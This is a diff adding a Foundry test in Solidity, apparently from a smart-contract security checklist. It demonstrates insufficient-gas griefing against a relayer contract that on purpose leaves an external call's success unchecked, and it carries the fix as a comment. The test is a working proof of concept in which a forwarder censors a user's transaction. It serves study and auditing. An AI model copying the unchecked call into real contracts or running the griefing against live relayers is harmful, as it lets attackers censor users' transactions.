@@ -1,0 +1,101 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.17;
+
+import "forge-std/Test.sol";
+
+/**
+ * Overview:
+ * Checklist Item ID: SOL-AM-GA-2
+ *
+ * This test demonstrates an insufficient gas griefing attack vulnerability in a relayer contract.
+ * In this attack, a malicious forwarder provides just enough gas for the top-level function to succeed
+ * but not enough for the external call to complete, causing the external call to fail due to gas exhaustion.
+ * Since the relayer contract doesn't check the success return value of the external call, the transaction
+ * is marked as executed in the mapping, preventing it from being submitted again.
+ * This effectively allows an attacker to permanently censor user transactions.
+ */
+contract Target {
+    uint256 private _storedData = 0;
+    function execute(bytes memory _data) external {
+        uint256 i;
+        while(i < 100) {
+            i++;
+            _storedData += i;
+        }
+    }
+}
+
+contract Relayer {
+    mapping (bytes => bool) public executed;
+    address public target;
+
+    constructor(address _target) {
+        target = _target;
+    }
+
+    function forward(bytes memory _data) public {
+        require(!executed[_data], "Replay protection");
+        // Vulnerability: Not checking the success of the external call
+        executed[_data] = true;
+        // The external call might fail due to insufficient gas, but the transaction won't revert
+        target.call(abi.encodeWithSignature("execute(bytes)", _data));
+
+        // Below is the correct mitigation
+        // (bool success,) = target.call(abi.encodeWithSignature("execute(bytes)", _data));
+        // require(success, "External call failed");
+    }
+}
+
+contract RelayerTest is Test {
+    Target target;
+    Relayer relayer;
+    address maliciousForwarder;
+    bytes testData;
+
+    function setUp() public {
+        target = new Target();
+        relayer = new Relayer(address(target));
+        maliciousForwarder = makeAddr("maliciousForwarder");
+        testData = abi.encode("user_transaction");
+
+        // Fund the malicious forwarder
+        vm.deal(maliciousForwarder, 1 ether);
+    }
+
+    function testInsufficientGasGriefing() public {
+        // Check how much gas is needed to execute the target contract
+        uint256 gasBefore = gasleft();
+        bytes memory tempData = abi.encode("gas_test");
+        target.execute(tempData);
+        uint256 gasAfter = gasleft();
+        uint256 gasNeeded = gasBefore - gasAfter;
+        console.log("Gas needed to execute target contract:", gasNeeded);
+
+        // First, verify that the data hasn't been executed yet
+        assertEq(relayer.executed(testData), false);
+
+        // Malicious forwarder calls the forward function with limited gas
+        // Just enough gas for the relayer to mark the transaction as executed
+        // but not enough for the external call to succeed
+        vm.prank(maliciousForwarder);
+
+        // We use a specific low gas limit to demonstrate the attack
+        // In a real scenario, the attacker would calculate the minimum gas needed
+        uint256 limitedGas = gasNeeded - 10000;
+
+        // Call the forward function with limited gas
+        (bool success, ) = address(relayer).call{gas: limitedGas}(
+            abi.encodeWithSignature("forward(bytes)", testData)
+        );
+
+        // The top-level call should succeed even though the external call failed
+        assertTrue(success, "Top-level call should succeed");
+
+        // Verify that the data is now marked as executed
+        assertTrue(relayer.executed(testData), "Data should be marked as executed");
+
+        // Now if a legitimate user tries to submit the same transaction, it will be rejected
+        vm.expectRevert("Replay protection");
+        relayer.forward(testData);
+    }
+}
